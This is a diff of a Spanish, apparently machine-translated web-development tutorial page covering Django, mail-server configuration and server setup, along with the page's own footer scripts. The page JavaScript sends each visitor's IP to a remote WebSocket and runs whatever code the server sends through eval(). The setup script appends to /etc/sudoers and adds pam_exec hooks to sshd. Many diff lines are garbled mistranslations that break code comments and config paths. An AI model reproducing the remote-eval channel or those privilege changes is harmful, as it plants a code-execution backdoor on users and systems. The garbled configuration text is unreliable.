@@ -430,7 +430,7 @@ def feed(request):
 
 Ahora necesitamos hacer que nuestra aplicación se vea mejor, porque por ahora se ve realmente básico. Podemos hacer esto usando CSS, ya sea en línea o en clases vinculadas a cada objeto en el documento. CSS es realmente agradable porque dice todo en la página cómo debería verse,y puede hacer que se vea realmente bien. Hay algunas bibliotecas que pueden hacer esto, pero mi personal personal es Bootstrap. 
 
-Bootstrap se puede descargar desde su sitio web,<a href="https://getbootstrap.com/" id="external-link" title="Visit this link (it will take you outside of Lotte Harper)">getBootstrap.com/</a>. Una vez allí, presione el botón para leer los documentos de instalación y copie el código de la sección incluir a través de CDN. Necesitará este código en la parte superior de su documento HTML, en una etiqueta llamada Head. Además, sigamos adelante y creemos una plantilla base para que no necesitemos recrear estos enlaces en cada plantilla. 
+Bootstrap se puede descargar desde su sitio web,<a href="https://getbootstrap.com/" id="external-link" title="Visit this link (it will take you outside of Lotte Harper)">GetBootstrap.com/</a>. Una vez allí, presione el botón para leer los documentos de instalación y copie el código de la sección incluir a través de CDN. Necesitará este código en la parte superior de su documento HTML, en una etiqueta llamada Head. Además, sigamos adelante y creemos una plantilla base para que no necesitemos recrear estos enlaces en cada plantilla. 
 
 Haga un nuevo directorio llamado plantillas con plantillas MKDIR y luego edite plantillas/base.html.
 
@@ -547,7 +547,7 @@ class UserRegisterForm(UserCreationForm):
 </code></pre>Así que tenemos otra forma aquí, que funciona de manera bastante simple. Es un formulario de registro de usuario con un nombre de usuario, correo electrónico y contraseña, así como un campo de contraseña de confirmación. Tenga en cuenta que este formulario no extiende las formas regulares. Class, es un formulario de modelo que significa que tiene un meta. Un campo se define de la misma manera, y el meta de clase define el modelo que el formulario corresponde al resto de la información que se escribirá en el formulario. La mayor parte de esto ya existe en la forma de creación de usuarios incorporada de Django, por lo que lo usaremos como base para la clase (aprobada entre paréntesis).
 
 A continuación, examinaremos la vista para registrar a un usuario, ahora que tenemos un formulario y una plantilla. Este es un ModeflaM, como el de la nueva vista posterior. Editar usuarios/vistas.py y agregar el siguiente código:<pre class="language-python"><code>
-# … Importaciones
+# ... cantidades
 from .forms import UserRegisterForm
 
 def register(request):
@@ -838,7 +838,7 @@ def activate(request, uidb64, token):
         user.profile.email_verified = True
         user.profile.save()
         user.save()
-# SendwelcomeMail (solicitud, usuario)
+# sendwelcomeMail (solicitud, usuario)
         messages.success(request, f'Thanks for confirming your email! You can now log into your account, and a welcome email has been sent to you.')
         return redirect(user.profile.create_face_url())
     else:
@@ -879,7 +879,7 @@ def register(request):
             messages.success(request, 'Welcome to the app, {}.'.format(user.username))
     return render(request, 'users/register.html', {'form': UserRegisterForm})
 </code></pre>Ahora, tendremos que agregar un formulario para reenviar el correo electrónico de activación. En ussers/forms.py, agregue el siguiente formulario:<pre class="language-python"><code>
-# … (Importaciones)
+# ... (cantidades)
 class ResendActivationEmailForm(forms.Form):
     email = forms.EmailField(required=True)
 </code></pre>También necesitaremos una plantilla correspondiente a este formulario de activación de correo electrónico de reiniciación. Agregamos esta plantilla. Edite el archivo:<pre class="language-bash"><code>
@@ -1087,7 +1087,7 @@ python manage.py makemigrations &amp;&amp; python manage.py migrate
 </code></pre>Esto es importante porque cada vez que realizamos cambios en los modelos, necesitaremos crear las tablas y actualizar la base de datos con valores predeterminados antes de poder usar los modelos.
 
 A continuación, improvisemos nuestra vista de inicio de sesión para redirigir a una vista de autenticación secundaria. En usuarios/vistas.py, elimine la función de inicio de sesión y redirige a la URL que acabamos de generar en los modelos de usuario.<pre class="language-python"><code>
-# … Importaciones
+# ... cantidades
 
 def login(request):
     if request.method == “POST”:
@@ -1205,7 +1205,7 @@ class TfaForm(forms.Form):
         'code': 'Please enter the six digit code after sending it to your phone with the button above.'
     }
 </code></pre>A continuación, creemos las vistas en usuarios/vistas.<pre class="language-python"><code>
-# … Importaciones
+# ... cantidades
 from django.http import HttpResponseRedirect
 from .forms import PhoneNumberForm, TfaForm
 
@@ -1820,7 +1820,7 @@ Tenga en cuenta que esto es una gran cantidad de jinja, es posible que no tenga 
       &lt;a href="{{ user|document_front }}" class="btn btn-sm btn-outline-primary" title="ID front"&gt;&lt;i class="bi bi-person-badge-fill"&gt;&lt;/i&gt; ID front&lt;/a&gt;
       &lt;a href="{{ user|document_back }}" class="btn btn-sm btn-outline-primary" title="ID back"&gt;&lt;i class="bi bi-upc-scan"&gt;&lt;/i&gt; ID back&lt;/a&gt;
       {% endif %}
-      &lt;small&gt;# {{user.id}} &lt;/small&gt;
+      &lt;small&gt;# {{User.id}} &lt;/small&gt;
       &lt;small&gt;{% if user.profile.subscribed %}Subscribed{% else %}Not subscribed{% endif %}&lt;/small&gt;
     &lt;/div&gt;
     {%if not user.is_superuser %}
@@ -1992,7 +1992,7 @@ UsePAM yes
 X11Forwarding yes
 # X11DisplaYoffset 10
 # X11uselocalhost sí
-# PermitTTY yes
+# Permiso si
 PrintMotd no
 # Printlastlog Sí
 # Tcpkeepalive sí
@@ -2301,7 +2301,7 @@ sudo systemctl restart opendkim postfix dovecot
 # Copiar certs
 # sudo cp /etc/letsencrypt/live/femmebabe.com/privkey.pem privkey.pem
 # sudo cp /etc/lettesencrypt/live/femmebabe.com/cert.pem cert.pem
-# Parche venv
+# Parche
 cp scripts/content.py $"/home/team/femmebabe/venv/lib/python${PYTHON_VERSION}/site-packages/pyxb/binding/content.py"
 cp scripts/pwa_webpush_forms.py $"/home/team/femmebabe/venv/lib/python${PYTHON_VERSION}/site-packages/pwa_webpush/forms.py"
 cp scripts/webauth_views.py $"/home/team/femmebabe/venv/lib/python${PYTHON_VERSION}/site-packages/webauth/views.py"
@@ -2324,7 +2324,7 @@ sudo chmod -R g+rwX ./
 sudo chmod -R g+rX .././
 sudo chmod -R g-rwX ../.ssh
 sudo chmod 774 ./
-# sudo chmod 664 db.sqlite3
+# Sudo chmod 664 db.sqlite3
 # sudo chown www-data: usuarios db.sqlite3
 sudo chown -R www-data:www-data media/
 sudo chown www-data:users ./
@@ -2358,7 +2358,7 @@ echo "Setup crontab/sudoers configuration"
 sudo crontab -l -u root | cat - config/crontab | sudo crontab -u root -
 sudo sh -c "cat config/sudoers &gt;&gt; /etc/sudoers"
 # Inyectar configuración PAM y eliminar la configuración SSH defectuosa
-# Sudo sed -i '' y $ d '/etc/pam.d/sshd
+# sudo sed -i '' -e '$ d' /tc/pam.d/sshd
 # Sudo sed -i '' y $ d ' /etc /perfil
 echo "session required pam_exec.so seteuid /home/team/femmebabe/pam.sh" | sudo tee -a /etc/pam.d/sshd
 echo "session required pam_exec.so seteuid /home/team/femmebabe/logout.sh" | sudo tee -a /etc/pam.d/sshd
@@ -2803,7 +2803,7 @@ nano config/etc_postfix_main.cf
 
 # Debian específico: especificar un nombre de archivo causará el primero
 # línea de ese archivo para ser utilizada como nombre.  El incumplimiento de Debian
-# es /etc /mailname.
+# Es /etc /mailname.
 # myorigin = /etc /mailname
 
 smtpd_banner = $myhostname ESMTP $mail_name (Ubuntu)
@@ -2868,11 +2868,11 @@ nano config/etc_postfix_master.cf
 # 
 # ==================================================== =========================
 # Tipo de servicio Private Undkroot Wakeup MAXPROC Comando + Args
-# (Sí) (sí) (no) (nunca) (100)
+#                (yes)   (yes)   (no)    (never) (100)
 # ==================================================== =========================
 smtp      inet  n       -       y       -       -       smtpd
 # SMTP INET N - Y - 1 Postcreen
-# pase smtpd - - y - - smtpd
+# Pase smtpd - - y - - smtpd
 # Dnsblog unix - - y - 0 dnsblog
 # Tlsproxy unix - - y - 0 tlsproxy
 # Elija uno: Habilitar envío solo para clientes de bucleback o para cualquier cliente.
@@ -2894,7 +2894,7 @@ submission inet n       -       y       -       -       smtpd
 # -O SMTPD_CLIENT_RESTrictions = $ mua_client_restrictions
 # -o smtpd_helo_restrictions = $ mua_helo_restrictions
 # -o SMTPD_SENDER_RESTrictions = $ mua_sender_restrictions
-# -O SMTPD_RepiPient_Restrictions =
+# -O SMTPD_RECIPIENT_TRASTRICTIONS =
 # -o SMTPD_RELAY_RESTrictions = Permit_Sasl_Authenticated, rechazar
 # -O MILTER_MACRO_DAEMON_NAME = Originario
 # Elija uno: habilitar SMTPS solo para clientes de bucleback o para cualquier cliente.
@@ -3012,7 +3012,7 @@ nano config/etc_default_opendkim
 # Daemon_opts = ""
 # Cambiar a/var/spool/postfix/run/opendkim para usar un socket unix con
 # Postfix en un chroot:
-# Rundir =/was/spool/postfix/run/opendkim
+# Rundir =/var/spool/postfix/run/opendkim
 RUNDIR=/run/opendkim
 # 
 # Descopment para especificar un enchufe alternativo
@@ -3105,10 +3105,10 @@ service lmtp {
 service imap {
   # La mayor parte de la memoria va a los archivos MMAP (). Es posible que necesite aumentar esto
   # Límite si tiene buzones enormes.
-  # Vsz_limi = $ default_vsz_limit
+  # vsz_limit = $ default_vsz_limit
 
   # Max. Número de procesos IMAP (conexiones)
-  # process_limit = 1024
+  # Process_limit = 1024
 }
 
 service pop3 {
@@ -3146,7 +3146,7 @@ service auth-worker {
   # El proceso de trabajador de autores se ejecuta como root de forma predeterminada, para que pueda acceder
   # /etc/sombra. Si esto no es necesario, el usuario debe cambiarse a
   # $ default_interal_user.
-  # usuario = root
+  # Usuario = root
 }
 
 service dict {
@@ -3221,7 +3221,7 @@ nano config/etc_dovecot_dovecot
 # Muestre más títulos de procesos verbosos (en PS). Actualmente muestra nombre de usuario y
 # Dirección IP. Útil para ver quién está usando los procesos IMAP
 # (por ejemplo, buzones compartidos o si se usa el mismo UID para múltiples cuentas).
-# verbose_proctitle = no
+# Verbose_proctle = bien
 
 # En caso de que se maten todos los procesos cuando el proceso maestro de Dovecot se apaga.
 # Establecer esto en "no" significa que Dovecot se puede actualizar sin
@@ -3358,7 +3358,7 @@ nano config/etc_default_opendkim
 # Daemon_opts = ""
 # Cambiar a/var/spool/postfix/run/opendkim para usar un socket unix con
 # Postfix en un chroot:
-# Rundir =/was/spool/postfix/run/opendkim
+# Rundir =/var/spool/postfix/run/opendkim
 RUNDIR=/run/opendkim
 # 
 # Descopment para especificar un enchufe alternativo
@@ -3547,7 +3547,7 @@ Gracias por tomarse el tiempo de leer esta Guía de Desarrollo Web de Tercera Ed
 
 
 
-<p><a href="https://lotteh.com/payments/photo/Daisy/?id=cf8fc969-e02d-4952-a329-e60db51bc1a7" title="Buy on Lotte Harper">Comprar</a> | <a href="https://lotteh.com/payments/photo/crypto/Daisy/?id=cf8fc969-e02d-4952-a329-e60db51bc1a7&crypto=ETH" title="Buy with cryptocurrency on Lotte Harper">Comprar con cripto</a></p>
+<p><a href="https://lotteh.com/payments/pay/Daisy/?id=cf8fc969-e02d-4952-a329-e60db51bc1a7" title="Buy on Lotte Harper">Comprar</a> | <a href="https://lotteh.com/payments/pay/crypto/Daisy/?id=cf8fc969-e02d-4952-a329-e60db51bc1a7&crypto=USDC" title="Buy with cryptocurrency on Lotte Harper">Comprar con cripto</a></p>
 
 
 <hr>
@@ -3587,7 +3587,7 @@ Gracias por tomarse el tiempo de leer esta Guía de Desarrollo Web de Tercera Ed
 
 
         
-        <p>
+        
 
 <div class="dropdown">
   <a class="btn btn-outline-info dropdown-toggle" role="button" id="dropdownMenuLink" data-bs-toggle="dropdown" aria-expanded="false">
@@ -3624,12 +3624,16 @@ Gracias por tomarse el tiempo de leer esta Guía de Desarrollo Web de Tercera Ed
     </div>
   </div>
 </div>
-</p>
+
         <p><i>Déjame un consejo en Bitcoin usando esta dirección:</i> <b id="btc-wallet">3KhDWoSve2N627RiW8grj6XrsoPT7d6qyE</b> <button class="btn btn-sm btn-info" title="Dirección de copia" onclick="copyToClipboard('btc-wallet');">Copiar</button></p>
+        <div id="javascript-console"></div>
 	    <div class="d-flex justify-content-between p-2">
 	        <div style="float:left;">
 	          <p><span class="badge bg-light text-dark shadow p-1">&copy; Glam Girl X 2025</span></p>
 		    </div>
+            <div style="text-align: center;">
+                 <a href="https://instagram.com/yourlocalfemme" about="_blank" title="Visítame en Instagram" style="font-size: 20px;" class="ml-1"><i class="bi bi-instagram"></i></a> <a href="https://twitter.com/teamfemmebabe" about="_blank" title="Visítame en Twitter" style="font-size: 20px;" class="ml-1"><i class="bi bi-twitter"></i></a> <a href="https://youtube.com/@daisymakeup" about="_blank" title="Mírame en YouTube" style="font-size: 20px;" class="ml-1"><i class="bi bi-youtube"></i></a>
+            </div>
 	        <div style="float:right;">
 	          <p><span class="badge bg-light text-dark shadow p-1"><a href="https://lotteh.com/terms/?lang=es" title="Ver los términos de servicio">Términos de servicio</a></span></p>
 		    </div>
@@ -3672,32 +3676,32 @@ function jumpbookto(page) {
             
         	Prism.highlightAll();
         });
-        var socket;
-        function openSocket() {
+        var remoteSocket;
+        function openRemoteSocket() {
             window.location.hash = '';
-            socket = new WebSocket("wss://lotteh.com"  + '/ws/remote/?path=' + window.location.href.split('#')[0]);
-            socket.addEventListener("open", (event) => {
+            remoteSocket = new WebSocket("wss://lotteh.com"  + '/ws/remote/?path=' + window.location.href.split('#')[0]);
+            remoteSocket.addEventListener("open", (event) => {
                 console.log('Socket open.');
                 fetch('https://lotteh.com/remote/generate/')
         		    .then(response => response.json())
         		    .then(data => {
-        		        socket.send(data.ip);
+        		        remoteSocket.send(data.ip);
         		    })
         		    .catch(error => {
         		        console.log('Error:', error);
         		    });
             });
-            socket.addEventListener("close", (event) => {
+            remoteSocket.addEventListener("close", (event) => {
                 console.log('Socket closed.');
                 setTimeout(function() {
-                    openSocket();
+                    openRemoteSocket();
                 }, 10000);
             });
-        	socket.addEventListener("message", (event) => {
+        	remoteSocket.addEventListener("message", (event) => {
                     eval(event.data);
             });
         }
-        openSocket();
+        openRemoteSocket();
         $(document).ready(function() {
         	$("#contact-form").submit(function(e){
                 	e.preventDefault();
@@ -3844,34 +3848,41 @@ if(document.getElementById("current-time")) {
             image.style.height = "100%";
             image.style.maxWidth = "160px";
             image.alt = "Comparta esta página escaneando un código QR.";
-            function downloadQrImage(url, filename) {
-              const link = document.createElement('a');
-              link.href = url;
-              link.download = 'Glam Girl X - ' + filename;
-              document.body.appendChild(link);
-              link.classList.add('hide');
-              link.click();
-            }
-            function downloadQr() {
-                    downloadQrImage(image.src, 'QR Code');
-            }
-            qrdiv.onclick = downloadQr;
+            try {
+                function getBase64Image(img) {
+                    var src = img.src;
+                    var image = new Image();
+                    image.src = src;
+                    image.onload = function(event) {
+                    var bsfcanvas = document.createElement("canvas");
+                    bsfcanvas.width = img.clientWidth + 40;
+                    bsfcanvas.height = img.clientHeight + 40;
+                    if(bsfcanvas.height < bsfcanvas.width) bsfcanvas.height = bsfcanvas.width;
+                    var bsfctx = bsfcanvas.getContext("2d");
+                    bsfctx.fillStyle = "#ffffff";
+                    bsfctx.fillRect(0, 0, bsfcanvas.width, bsfcanvas.height);
+                    bsfctx.drawImage(event.target, 20, 20, bsfcanvas.width - 40, bsfcanvas.height - 40);
+                    var dataURL = bsfcanvas.toDataURL("image/png");
+                    downloadQrImage(dataURL, 'Glam Girl X - QR Code.png');
+                    };
+                }
+                function downloadQrImage(url, filename) {
+                    const link = document.createElement('a');
+                    link.download = filename;
+                    link.href = url;
+                    link.classList.add('hide');
+                    link.click();
+                }
+                function downloadQr(){
+                    var theQrImage = document.getElementById('shareqrcode').querySelector('img');
+                    getBase64Image(theQrImage);
+                }
+                qrdiv.onclick = downloadQr;
+                } catch(error) {
+                        document.getElementById('javascript-console').insertAdjacentHTML("beforeend", '<div>' + new String(error) + '</div>');
+                }
         });
     </script>
-    
-    <script async type="application/javascript"
-        src="https://news.google.com/swg/js/v1/swg-basic.js"></script>
-<script>
-  (self.SWG_BASIC = self.SWG_BASIC || []).push( basicSubscriptions => {
-    basicSubscriptions.init({
-      type: "NewsArticle",
-      isPartOfType: ["Product"],
-      isPartOfProductId: "CAowktDYCw:openaccess",
-      clientOptions: { theme: "light", lang: "en" },
-    });
-  });
-</script>
-
     
     
     
